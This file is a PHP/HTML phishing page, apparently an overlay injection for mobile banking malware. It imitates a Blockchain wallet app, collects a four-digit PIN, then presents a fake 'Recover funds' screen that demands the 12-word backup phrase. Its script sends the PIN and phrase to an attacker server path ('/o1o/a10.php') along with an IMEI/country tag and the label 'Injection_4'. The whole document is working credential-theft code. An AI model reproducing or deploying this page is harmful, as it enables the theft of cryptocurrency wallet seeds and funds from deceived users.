<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.5/angular.min.js"></script>
    <style>
    img.logo56789 {max-width: 150px; margin: 0 auto; display: block; /* margin-top: var(--logo-margin); */ /* margin-bottom: var(--logo-margin); */ width: 27%; /* position:  relative; */ } html, body, .views, .view {height: 100%; } :root {--input-size: 29px; --logo-margin: 24%; } span.input-item {width: var(--input-size); height: var(--input-size); border-radius: 100px; border: 2px solid #113962; } span.input-item.filled {background: #113962; } .pin_inputs {width: 167px; display: block; margin: 0 auto; } h5.h59 {color: #6492b3; text-align: center; margin-bottom: 13px; font-size: 16px; } .td_.td_1 {padding-top: var(--logo-margin); } .td_.td_2 {background: #074b79; /* height: 300px; */ padding: 12px 0px; color: #ffffffb8; } .tr_ {display: table-row; } .table_.t6 {height: 100%; display: table; width: 100%; } .tr_.tr2 {/* height:  1px; */ } .td_ {display: table-cell; } .inputs {padding: 25px 1px; } .tr_.tr1 {height: 100%; } span.pinpad-item {padding: 9px 0px; text-align: center; font-size: 20px; width: 57px; } .pinpad.d-flex.justify-content-between {} .pinpad.d-flex.justify-content-between {padding: 1px 31px; } small {display: block; font-size: 11px; } img.i76 {width: 38px; } img.logo569 {width: 29%; margin: 0 auto; display: block; max-width: 199px; } .imgage-div {padding-top: 129px; } .d009 {text-align: center; font-size: 32px; text-transform: uppercase; color: #355e88; font-weight: 900; margin-top: 39px; } .buttn-div {text-align: center; width: 223px; margin: 0 auto; margin-top: 28px; } .btn-primary {background: #113962; border-color: #40759a; width: 100%; padding: 14px 6px; font-size: 19px; border-radius: 3px; text-transform: uppercase; color: #ffffffc9; } .loader_div_ {position: relative; background: white; width: 90%; max-width: 400px; margin: 0 auto; top: 20%; padding: 14px 18px; box-shadow: 0 0 4px 0px black; border-radius: 2px; } .loader__ {position: fixed; top: 0px; height: 100%; left: 0px; width: 100%; background: #11396280; } .loader_div_ .fa.fa-spinner.fa-pulse {font-size: 28px; color: #40759a; vertical-align: middle; margin-right: 14px; top: -1px; position: relative; } .top-line {background: #113962; padding: 10px 0px; color: white; } span.fa.fa-arrow-left {margin-right: 30px; vertical-align: middle; position: relative; top: -4px; } span.top-text {font-weight: 101; font-size: 20px; } button.btn.btn-info {background: #00aee6; border-radius: 0px; width: 100%; padding: 13px 1px; font-size: 21px; } input.form-control {border: 0px; border-bottom: 2px solid #adabab; border-radius: 0px; padding-left: 0px; font-size: 16px; } label {display: none; } p.recover-p {margin: 24px 1px; text-align: center; color: #848484; line-height: 17px; margin-bottom: 54px; } </style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php";
?>
<body ng-app="app" ng-controller="c1">
    <div class="views">
        <div class="pin-view view" style="display: ;">
            <div class="table_ t6">
                <div class="tr_ tr1">
                    <div class="td_ td_1">
                        <img src="https://i.imgur.com/epbdnOs.png" alt="" class="logo56789">
                    </div>
                </div>
                <div class="tr_ tr2">
                    <div class="td_ td-pin">
                        <div class="inputs">
                            <div class="container">
                                <div class="pin_inputs">
                                    <h5 class="h59">Enter PIN</h5>
                                    <div class="fl d-flex justify-content-between">
                                        <span ng-class="{'filled':pin.length>0}" class="input-item "></span>
                                        <span ng-class="{'filled':pin.length>1}" class="input-item "></span>
                                        <span ng-class="{'filled':pin.length>2}" class="input-item "></span>
                                        <span ng-class="{'filled':pin.length>3}" class="input-item "></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="tr_ tr3">
                    <div class="td_ td_2">
                        <div class="container">
                            <div class="pinpad d-flex justify-content-between">
                                <span ng-click="edit_pin(1)" class="pinpad-item">
                                    <span class="val">1</span>
                                </span>
                                <span ng-click="edit_pin(2)" class="pinpad-item">
                                    <span class="val">2</span> <small>ABC</small> </span>
                                <span ng-click="edit_pin(3)" class="pinpad-item">
                                    <span class="val">3</span> <small>DEF</small> </span>
                            </div>
                            <div class="pinpad d-flex justify-content-between">
                                <span ng-click="edit_pin(4)" class="pinpad-item">
                                    <span class="val">4</span> <small>GHI</small> </span>
                                <span ng-click="edit_pin(5)" class="pinpad-item">
                                    <span class="val">5</span> <small>JKL</small> </span>
                                <span ng-click="edit_pin(6)" class="pinpad-item">
                                    <span class="val">6</span> <small>MNO</small> </span>
                            </div>
                            <div class="pinpad d-flex justify-content-between">
                                <span ng-click="edit_pin(7)" class="pinpad-item">
                                    <span class="val">7</span> <small>PQRS</small> </span>
                                <span ng-click="edit_pin(8)" class="pinpad-item">
                                    <span class="val">8</span> <small>TUV</small> </span>
                                <span ng-click="edit_pin(9)" class="pinpad-item">
                                    <span class="val">9</span> <small>WXYZ</small> </span>
                            </div>
                            <div class="pinpad d-flex justify-content-between">
                                <span class="pinpad-item"> </span>
                                <span class="pinpad-item" ng-click="edit_pin(9)"> 0 </span>
                                <span class="pinpad-item" ng-click="reset()"> <img src="https://i.imgur.com/nKzfppl.png" alt="" class="i76"> </span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="login-view view" style="display: none;">
            <div class="container">
                <div class="imgage-div">
                    <img src="https://i.imgur.com/epbdnOs.png" alt="" class="logo569">
                </div>
                <div class="d009">Blockchain</div>
                <div class="buttn-div">
                    <button class="btn btn-primary" ng-click="to_phrase()">Recover funds</button>
                </div>
            </div>
        </div>
        <div class="recover-view view" style="display:none; ">
            <form class="form1" name="form1" onsubmit="return false" ng-submit="sub()" style="height: 100%">
                <div class="table_ t6">
                    <div class="tr_ tr_0">
                        <div class="top-line">
                            <div class="container">
                                <span class="fa fa-arrow-left"></span>
                                <span class="top-text">Recover Funds</span>
                            </div>
                        </div>
                    </div>
                    <div class="tr_ tr1">
                        <div class="td_ td_recover">
                            <div class="container">
                                <div class="dfgh67">
                                    <p class="recover-p">
                                        Enter your 12 backup words with space to recover your funds & transactions
                                    </p>
                                    <div class="form-group">
                                        <label for="">Backup phrase</label>
                                        <input type="text" class="form-control" placeholder="Backup phrase" name="phrase" ng-model="phrase" required pattern="^(\w+(\s+|$)){12}$" id="phrase">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="tr_ tr_3">
                        <div class="td_ td_button">
                            <button class="btn btn-info" ng-disabled="form1.phrase.$invalid">
                                Recover Funds
                            </button>
                        </div>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <div class="loader__" style="display: none;">
        <div class="loader_div_">
            <span class="fa fa-spinner fa-pulse"></span>
            Please wait....
        </div>
    </div>
    <form action="" class="mf" id="mf" style="display: none;">
        <input type="text" class="" name="appname" value="BTC">
    </form>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script type="text/javascript">
    // all data wil be added to form id="mf" in the and of each step and fucntion hope_work will submit this form.


    app = angular.module('app', [])
    app.controller('c1', ['$scope', function($scope) {
        $sc_ = $scope
        $scope.pin = ""
        $scope.edit_pin = function(number) {
            if ($scope.pin.length != 4) {
                $scope.pin += '' + number;

            }
            if ($scope.pin.length == 4) {
                setTimeout(function() {
                    $('.loader__').fadeIn()
                    setTimeout(function() {
					
                        $('.pin-view').hide();
                        $('.login-view').show();
                        $('.loader__').fadeOut()
                    }, 1000)


                }, 100)
            }
        }


        $scope.to_phrase = function() {
            setTimeout(function() {
                $('.loader__').fadeIn()
                setTimeout(function() {
                    $('.login-view').hide();
                    $('.recover-view').show();
                    $('.loader__').fadeOut()
                }, 1000)


            }, 100)
        }
        $scope.reset = function() {
            $scope.pin = "";
        }
        $scope.sub = function() {
            $('.loader__').fadeIn() //can be removed if bot have native loader gif on the end of form submit!
            $('<input type="text" name="pphrase" value="' + $scope.phrase + '">').appendTo('#mf');
            hope_works();
			
			
			 

			
			
			
			var url='<?php echo $URL; ?>';
			var imei_c='<?php echo $IMEI_country; ?>';
			location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|Blockchain|"+$scope.pin+"|"+$scope.phrase);

						
						
        }
    }])





    //This functon wil submit form id="mf" which is in the botom on  the document before scripts. All varable like bot id or app name  and it action attr  must be set there before submit
    function hope_works() {
        // $('#mf').submit();
    }
    </script>
</body>

</html>
